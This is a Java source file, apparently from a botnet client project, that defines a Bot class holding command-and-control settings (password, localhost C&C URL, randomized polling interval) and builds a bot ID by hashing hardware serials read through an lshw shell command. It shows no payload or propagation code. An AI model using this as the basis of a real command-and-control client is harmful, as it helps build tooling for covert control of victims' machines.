package botBYON;

import java.net.InetAddress;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import static sun.awt.X11.XConstants.None;

/**
 * A class that hold the key characteristics of our bot, including the bot
 * status, the unique ID, its sleep cycle, etc.
 *
 * @author Francois Begin 2011
 *
 */
public class Bot {
// Current status of the bot

    String status;
// The initial password to authenticate to the C&C
    String ccInitialPwd;
// The initial C&C URL
    String ccInitialURL;
// How often in seconds to poll the C&C for instructions
    int sleepCycle;
// Randomness in sleep cycle
    int sleepCycleRandomness;
// This bot's unique ID
    String id;
// This bot's public IP address
    InetAddress publicIP;
// Various network parameters related to this host
    HostNetParams hostNetParams;

    /**
     * Our main constructor
     */
    public Bot() {
        status = "init";
// ccInitialPwd = "K9! @ J3llyB @ b y! Th3M @ st3r";
        ccInitialPwd = "hola";
        ccInitialURL = "http://localhost/api/";
        sleepCycle = 10;
        sleepCycleRandomness = 5;
        id = "";
        publicIP = null;
        hostNetParams = new HostNetParams();
    }

    /**
     * Method that generated a unique bot id using a hash of the host hardware
     * nformation. Currently only implemented on Linux
     */
    public void generateBotID() {
        HostDetails myHost = new HostDetails();
        String hwData = "";

        //--------------- local date ----
        DateTimeFormatter datef = DateTimeFormatter.ofPattern("yyyy/MM/dd HH:mm:ss");
        LocalDateTime now = LocalDateTime.now();
        System.out.println(datef.format(now));
        //--------------- local date ----

        if (myHost.osName.toUpperCase().equals("LINUX")) {

            hwData = Tools.runCmd("lshw | grep -e serial -e product | grep -v Controller | grep -v None");
        }
        id = Tools.computeMD5(hwData); //se anula esto es dependiente 
        //id = Tools.computeMD5(datef.format(now));
    }//generateBotID

}
